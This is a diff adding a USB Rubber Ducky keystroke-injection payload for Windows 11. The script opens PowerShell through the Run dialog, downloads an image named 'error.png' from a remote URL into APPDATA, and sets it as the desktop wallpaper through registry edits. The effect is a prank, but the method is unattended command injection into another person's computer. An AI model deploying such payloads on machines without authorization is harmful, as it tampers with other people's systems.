@@ -1,0 +1,28 @@
+REM Rubber Ducky Payload to change the desktop image on Windows 11
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri 'https://filestore.community.support.microsoft.com/api/images/86b402f3-2d24-49cb-8d12-11aa89b6aade?upload=true' -OutFile "$Env:APPDATA\error.png"
+ENTER
+DELAY 5000
+STRING if (Test-Path "$Env:APPDATA\error.png") {
+ENTER
+DELAY 500
+STRING Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value "$Env:APPDATA\error.png"
+ENTER
+DELAY 500
+STRING Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "10"
+ENTER
+DELAY 500
+STRING RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters
+ENTER
+STRING } else {
+ENTER
+STRING }
+ENTER
+STRING exit
+ENTER
